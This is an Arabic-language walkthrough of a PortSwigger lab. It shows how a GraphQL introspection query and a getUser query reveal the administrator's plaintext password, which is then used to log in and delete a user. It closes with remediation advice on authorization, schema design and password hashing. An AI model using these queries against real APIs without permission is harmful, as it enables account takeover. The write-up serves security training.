# [Accidental exposure of private GraphQL fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)

## **`الهدف`**
الدخول إلى حساب `administrator` وحذف حساب `carlos`.
## **`خطوات الحل`**
بعد الدخول إلى اللاب نقوم بالذهاب إلى `HTTP history` وسنجد أحد الـ `requests` بـ `URl` إلى `/graphql/v1`.

لذلك نقوم بإرسال هذا الـ `request` إلى `repeater` ونضغط `Mouse left-click` داخل الـ `request` ونختار `Set introspection query` ونقوم بعمل إرسال للـ `request` ونقوم بنسخ الـ `response` إلى موقع **[GraphQL Visualizer](https://nathanrandal.com/graphql-visualizer/)**، أو نسخ الـ `URL` إلى إضافة `InQL` المجانية داخل `Burp Suite`.

وبفحص الاستجابة التي تحتوى على المخطط سنكتشف أنه يجب علينا أن نعود إلى الـ `repeater` مرة أخرى فى نفس الـ `request` ونقوم بإرسال هذا  الـ `query`، لمعرفة بيانات المستخدم، ولكن سنحتاج إلى تجربة أرقام `ID`  حتى نصل للرقم الخاص بحساب `administrator` والذي في هذه الحالة هو `1`.
```GraphQL
query getUser {
    getUser(id: 1) {
        id
        password
        username
    }
}
```

وسنجد جميع البيانات ظاهرة في الاستجابة
```GraphQL
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 133

{
  "data": {
    "getUser": {
      "id": 1,
      "password": "bj1dic2obpe5om6rf7kn",
      "username": "administrator"
    }
  }
}
```

فنقوم بالتوجه إلى اللاب وندخل إلى حساب `administrator:bj1dic2obpe5om6rf7kn` ومن ثم التوجه إلى لوحة التحكم وحذف حساب `carlos` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب إيقاف خاصية الفحص الذاتي تمامًا في بيئة الإنتاج، وعلى الرغم من أن إغلاقها لن يمنع المهاجم من تخمين الحقول، ولكنه سيجعل الأمر أكثر صعوبة.

ويجب أن يتحقق النظام أولًا من الشخص الذي يطلب المعلومة وهل له الحق في الوصول لها أم لا `Authorization` ، وأن يتحقق من هوية صاحب الطلب من خلال الـ `Session & Token` ويقارنها بالـ `ID` المطلوب. فإذا كان المستخدم يطلب الـ `ID` الخاص به فيُسمح بالطلب، وإذا كان يطلب `ID` لمستخدم أخر فيتم رفض الطلب فورًا وإرجاع رسالة خطأ `(Unauthorized / Forbidden)`.

يجب إزالة حقل `Password` نهائيًأ في الـ `GraphQL Schema`، فلا يوجد أي سيناريو منطقي أو آمن يتطلب من الـ `API` إرجاع كلمة المرور الحالية للمستخدم.

ويجب على كلمات المرور أن تُخزن في قاعدة البيانات كـ `Hashes` مثل `Bcrypt` أو `Argon2` وليس كنص صريح، لأنه في هذه الحالة حتى لو نجحت ثغرة الـ `IDOR` فالمهاجم سيحصل على `Hash` غير قابل للقراءة المباشرة بدلاً من كلمة المرور الحقيقة.
